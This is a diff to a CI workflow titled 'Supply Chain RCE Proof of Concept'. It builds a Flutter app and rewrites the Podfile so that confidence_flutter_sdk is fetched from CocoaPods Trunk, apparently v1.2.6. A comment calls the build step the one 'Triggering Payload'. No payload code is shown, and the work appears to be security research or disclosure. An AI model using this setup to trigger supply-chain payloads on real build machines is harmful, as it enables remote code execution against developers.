@@ -1,5 +1,6 @@
 name: Supply Chain RCE Proof of Concept
 on: [push, workflow_dispatch]
+
 jobs:
   poc:
     runs-on: macos-latest
@@ -14,18 +15,34 @@ jobs:
           flutter create rce_test
           cd rce_test
           flutter pub add confidence_flutter_sdk
-          echo "=== Podfile content ==="
+          
+          echo "=== Podfile content BEFORE manual patch ==="
           cat ios/Podfile
+          
+          # 1. Patch Platform Version (Work as intended)
           sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
-          echo "=== Podfile after patch ==="
+          
+          # 2. HAPUS blok target otomatis agar tidak menggunakan symlink lokal (:path)
+          # Kita hapus baris 'flutter_install_all_ios_pods' yang isinya symlink otomatis
+          # Lalu kita tambahkan deklarasi pod secara manual tanpa :path agar tarik dari Trunk
+          sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
+          echo "pod 'confidence_flutter_sdk'" >> ios/Podfile
+          
+          echo "=== Podfile AFTER manual patch (Local Path Removed) ==="
           cat ios/Podfile
+          
           cd ios
           pod repo update
+          
+          # 3. Pod Install (Sekarang harusnya narik v1.2.6 dari Trunk)
           pod install --verbose 2>&1 | tee pod_install.log || true
+          
           echo "=== pod install result ==="
           tail -30 pod_install.log
           cat Podfile.lock 2>/dev/null || echo "Podfile.lock not generated"
+          
           cd ..
+          # 4. Build Phase (Triggering Payload)
           flutter build ios --no-codesign 2>&1 | tee build.log || true
           tail -20 build.log
 
